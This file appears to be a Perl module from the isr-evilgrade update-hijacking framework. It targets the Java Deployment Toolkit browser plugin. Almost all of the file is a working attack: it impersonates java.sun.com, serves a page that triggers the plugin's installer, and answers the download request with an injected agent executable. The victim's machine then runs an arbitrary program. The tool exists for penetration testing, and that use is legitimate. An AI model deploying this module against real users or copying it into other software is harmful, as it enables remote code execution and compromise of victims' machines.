###############
# jdtoolkit.pm
#
# Copyright 2011 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::jdtoolkit;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => ' Java Deployment Toolkit',
    'version'     => '1.0',
    'appver'      => '< v6.0.240.7',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com >'],
    'description' => qq{Found By: Neal Poole.
            The Java Deployment Toolkit Plugin v6.0.240.7 and below for Firefox and Google Chrome can be used to download
            and run an improperly signed executable on a target’s system. UAC, if enabled, will prompt the user before
            running the executable. This vulnerability has been tested and confirmed to exist on Windows 7, both 32-bit
            and 64-bit. It was fixed in Java 7 and Java 6 Update 29.
            https://nealpoole.com/blog/2011/10/java-deployment-toolkit-plugin-does-not-validate-installer-executable/},
    'vh'      => '(java.sun.com)',
    'request' => [
        {   'req'    => '/update.html',    #regex friendly
            'type'   => 'string',          #file|string|agent|install
            'method' => '',                #any
            'bin'    => 0,
            'string' => '
<html>
<head>
<title>Java Deployment Toolkit update</title>
</head>
<body>
<script src="http://www.java.com/js/deployJava.js"></script>
<script type="text/javascript">
deployJava.getPlugin().installLatestJRE();
</script>
</body>
</html>
            ',
            'parse' => 0,
            'file'  => '',
        },

        {   'req'    => '/webapps/download/AutoDL', #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
